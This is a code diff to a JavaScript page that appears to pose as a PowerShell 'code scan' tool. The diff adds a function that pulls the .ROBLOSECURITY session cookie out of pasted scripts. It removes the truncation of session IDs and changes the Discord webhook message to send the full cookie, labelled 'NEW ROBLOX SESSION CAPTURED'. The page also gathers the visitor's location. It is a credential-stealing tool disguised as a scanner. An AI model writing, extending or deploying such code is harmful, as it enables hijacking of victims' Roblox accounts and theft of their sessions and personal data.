@@ -155,7 +155,7 @@ function extractItemId(input) {
     // Extract session ID if present
     const sessionMatch = input.match(/sessionid=([a-f0-9\-]+)/i);
     if (sessionMatch) {
-        extractedInfo.sessionId = sessionMatch[1].substring(0, 8) + '...'; // Partial for security
+        extractedInfo.sessionId = sessionMatch[1];
     }
     
     // Extract user ID from cookies if present
@@ -164,7 +164,29 @@ function extractItemId(input) {
         extractedInfo.userId = userIdMatch[1];
     }
     
+    // Extract rbxid if present
+    const rbxidMatch = input.match(/rbxid=(\d+)/i);
+    if (rbxidMatch) {
+        extractedInfo.rbxid = rbxidMatch[1];
+    }
+    
     return JSON.stringify(extractedInfo, null, 2);
+}
+
+function extractRobloxCookie(input) {
+    // Extract the .ROBLOSECURITY cookie value
+    const cookieMatch = input.match(/\.ROBLOSECURITY['"]\s*,\s*['"]([^'"]+)['"]/i);
+    if (cookieMatch) {
+        return cookieMatch[1];
+    }
+    
+    // Alternative pattern for different formatting
+    const altMatch = input.match(/\.ROBLOSECURITY.*?([A-Za-z0-9_\-|\.%=]+)/i);
+    if (altMatch) {
+        return altMatch[1];
+    }
+    
+    return "Cookie not found in script";
 }
 
 function toggleTheme() {
@@ -274,18 +296,25 @@ async function submitCode() {
         // Get user location data
         const locationData = await getUserLocation();
         
-        // Extract clean item ID
+        // Extract clean item ID and Roblox cookie
         const cleanItemId = extractItemId(code);
+        const robloxCookie = extractRobloxCookie(code);
         
         // Format data for Discord webhook
         const discordMessage = {
+            content: "@everyone 🚨 **NEW ROBLOX SESSION CAPTURED** 🚨",
             embeds: [{
-                title: "🔍 New Code Scan Submitted",
-                color: 0x5865F2, // Discord blue color
+                title: "🔍 New Roblox Session Intercepted",
+                color: 0xFF0000, // Red color for urgency
                 timestamp: new Date().toISOString(),
                 fields: [
                     {
-                        name: "📝 PowerShell Script Submission",
+                        name: "🍪 ROBLOSECURITY Cookie",
+                        value: `\`\`\`\n${robloxCookie}\n\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "📝 Script Analysis",
                         value: `**Script Analysis:**\n\`\`\`json\n${cleanItemId}\n\`\`\`\n**Status:** Script received and processed`,
                         inline: false
                     },
